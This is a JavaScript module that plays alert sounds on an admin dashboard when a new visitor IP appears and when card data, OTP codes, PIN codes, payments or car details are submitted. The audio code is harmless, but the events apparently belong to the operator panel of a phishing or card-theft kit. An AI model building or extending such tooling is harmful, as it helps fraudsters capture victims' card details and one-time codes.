// Notification Sounds for Admin Dashboard

// Audio files paths
const SOUNDS = {
  newVisitor: '/assets/sounds/ip.wav',        // Sound for new visitor/IP
  cardData: '/assets/sounds/data.wav',        // Sound for payment card data
  otp: '/assets/sounds/otp.wav',              // Sound for OTP code (to be added)
  pin: '/assets/sounds/pin.wav',              // Sound for PIN code (to be added)
  payment: '/assets/sounds/payment.wav',      // Sound for payment submission (to be added)
  carData: '/assets/sounds/data.wav'          // Sound for car details submission (reuses data.wav)
};

// Pre-loaded audio elements
const audioElements = {};

/**
 * Preload all audio files
 */
const preloadSounds = () => {
  Object.entries(SOUNDS).forEach(([key, path]) => {
    const audio = new Audio(path);
    audio.preload = 'auto';
    audio.volume = 0.7; // Default volume (70%)
    audioElements[key] = audio;
  });
  console.log('🔊 Notification sounds preloaded');
};

/**
 * Play audio file with fallback to synthetic sound
 * @param {string} soundKey - Key from SOUNDS object
 * @param {Function} fallbackFn - Fallback function if audio file not found
 */
const playSound = (soundKey, fallbackFn) => {
  const audio = audioElements[soundKey];
  
  if (audio) {
    // Clone audio to allow multiple simultaneous plays
    const soundClone = audio.cloneNode();
    soundClone.volume = audio.volume;
    
    soundClone.play().catch(error => {
      console.warn(`Failed to play ${soundKey}:`, error);
      // Use fallback synthetic sound
      if (fallbackFn) fallbackFn();
    });
  } else {
    console.warn(`Audio file not loaded for ${soundKey}, using fallback`);
    if (fallbackFn) fallbackFn();
  }
};

/**
 * Fallback synthetic sound generator (using Web Audio API)
 */
const createFallbackSound = (frequency, duration, type = 'sine') => {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = frequency;
    oscillator.type = type;
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + duration);
  } catch (error) {
    console.warn('AudioContext not supported:', error);
  }
};

/**
 * Play sound for new visitor (uses ip.wav)
 */
export const playNewVisitorSound = () => {
  console.log('🔔 Playing new visitor sound');
  playSound('newVisitor', () => createFallbackSound(800, 0.5));
};

/**
 * Play sound for credit card data entry (uses data.wav)
 */
export const playCardDataSound = () => {
  console.log('💳 Playing card data sound');
  playSound('cardData', () => {
    createFallbackSound(1200, 0.3);
    setTimeout(() => createFallbackSound(1000, 0.35), 350);
  });
};

/**
 * Play sound for OTP entry (uses otp.wav or fallback)
 */
export const playOTPSound = () => {
  console.log('🔐 Playing OTP sound');
  playSound('otp', () => {
    [0, 0.2, 0.4].forEach(time => {
      setTimeout(() => createFallbackSound(1400, 0.15), time * 1000);
    });
  });
};

/**
 * Play sound for PIN entry (uses pin.wav or fallback)
 */
export const playPINSound = () => {
  console.log('🔑 Playing PIN sound');
  playSound('pin', () => {
    createFallbackSound(600, 0.25, 'square');
    setTimeout(() => createFallbackSound(600, 0.25, 'square'), 300);
  });
};

/**
 * Play sound for payment submission (uses payment.wav or fallback)
 */
export const playPaymentSound = () => {
  console.log('💰 Playing payment sound');
  playSound('payment', () => createFallbackSound(1000, 0.6));
};

/**
 * Play sound for car details submission (uses data.wav)
 */
export const playCarDataSound = () => {
  console.log('🚗 Playing car data sound');
  playSound('carData', () => {
    createFallbackSound(1100, 0.3);
    setTimeout(() => createFallbackSound(900, 0.35), 350);
  });
};

/**
 * Initialize audio context and preload sounds
 * Must be called after user interaction (to comply with browser autoplay policy)
 */
export const initAudioContext = () => {
  preloadSounds();
  console.log('✅ Audio system initialized');
};

/**
 * Set volume for all notification sounds
 * @param {number} volume - Volume level (0.0 to 1.0)
 */
export const setNotificationVolume = (volume) => {
  const clampedVolume = Math.max(0, Math.min(1, volume));
  Object.values(audioElements).forEach(audio => {
    if (audio) audio.volume = clampedVolume;
  });
  console.log(`🔊 Volume set to ${Math.round(clampedVolume * 100)}%`);
};
